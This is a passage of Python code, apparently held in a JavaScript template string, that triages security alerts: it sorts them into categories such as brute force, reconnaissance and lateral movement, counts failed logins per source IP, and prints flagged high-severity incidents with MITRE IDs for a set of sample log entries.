        mitre = rule.get("mitre", {}).get("id", ["Unclassified"])
        data = entry.get("data", {})
        src_ip = data.get("srcip") or data.get("win", {}).get("eventdata", {}).get("ipAddress") or "N/A"
        
        # Categorize
        if "SSH" in desc or "logon" in desc.lower() or "4625" in str(rule_id):
            attack_categories["Brute Force / Auth Failure"] += 1
            if src_ip != "N/A":
                attacker_ip_counts[src_ip] += 1
        elif "port scan" in desc.lower() or "87701" in str(rule_id):
            attack_categories["Network Reconnaissance"] += 1
        elif "pivot" in desc.lower() or "87702" in str(rule_id):
            attack_categories["Unauthorized Lateral Pivot"] += 1
        elif "dns" in desc.lower():
            attack_categories["Suspicious DNS / C2"] += 1
        else:
            attack_categories["General Telemetry Alert"] += 1
            
        if level >= 8:
            flagged_incidents.append({
                "timestamp": entry.get("timestamp"),
                "rule_id": rule_id,
                "severity_level": level,
                "description": desc,
                "src_ip": src_ip,
                "mitre_id": mitre[0] if isinstance(mitre, list) else str(mitre)
            })

    # Triage Findings
    print("\\n[+] ATTACK CATEGORY DISTRIBUTION:")
    for cat, count in attack_categories.items():
        print(f"    - {cat:<32}: {count:>4} events")
        
    print("\\n[!] SUSPICIOUS SOURCE IP FREQUENCY:")
    for ip, count in attacker_ip_counts.items():
        status = "⚠️  ALERT: THRESHOLD EXCEEDED" if count >= failed_login_threshold else "Monitoring"
        print(f"    - Source IP: {ip:<18} | Failures: {count:>3} | Status: {status}")
        
    print(f"\\n[+] HIGH/CRITICAL SEVERITY INCIDENTS DETECTED: {len(flagged_incidents)}")
    for inc in flagged_incidents[:5]:
        print(f"    * [Lvl {inc['severity_level']}] {inc['src_ip']} -> {inc['description']} (MITRE: {inc['mitre_id']})")
        
    return {
        "summary": {
            "total_events": len(log_records),
            "flagged_count": len(flagged_incidents),
            "threshold": failed_login_threshold
        },
        "categories": dict(attack_categories),
        "suspicious_ips": dict(attacker_ip_counts),
        "incidents": flagged_incidents
    }

if __name__ == "__main__":
    sample_data = [
        {"timestamp": "2026-11-03T09:30:15Z", "rule": {"id": 87701, "level": 6, "description": "pfSense: Inbound port scan connection blocked", "mitre": {"id": ["T1046"]}}, "data": {"srcip": "192.168.1.50", "dstport": "3389"}},
        {"timestamp": "2026-11-03T09:34:20Z", "rule": {"id": 5710, "level": 5, "description": "sshd: Failed password for user admin", "mitre": {"id": ["T1110.001"]}}, "data": {"srcip": "192.168.1.50"}},
        {"timestamp": "2026-11-03T09:34:22Z", "rule": {"id": 5710, "level": 5, "description": "sshd: Failed password for user admin", "mitre": {"id": ["T1110.001"]}}, "data": {"srcip": "192.168.1.50"}},
        {"timestamp": "2026-11-03T09:34:25Z", "rule": {"id": 5712, "level": 10, "description": "sshd: Multiple failed SSH attempts (Brute-Force suspected)", "mitre": {"id": ["T1110.001"]}}, "data": {"srcip": "192.168.1.50"}},
        {"timestamp": "2026-11-03T09:38:10Z", "rule": {"id": 60122, "level": 9, "description": "Multiple Windows logon failures (Event ID 4625)", "mitre": {"id": ["T1110"]}}, "data": {"srcip": "192.168.1.50"}},
        {"timestamp": "2026-11-03T09:45:18Z", "rule": {"id": 87702, "level": 12, "description": "CRITICAL: Unauthorized DMZ to Internal LAN Lateral Pivot Blocked", "mitre": {"id": ["T1021"]}}, "data": {"srcip": "192.168.20.10"}}
    ]
    analyze_security_logs(sample_data, failed_login_threshold=3)
`;
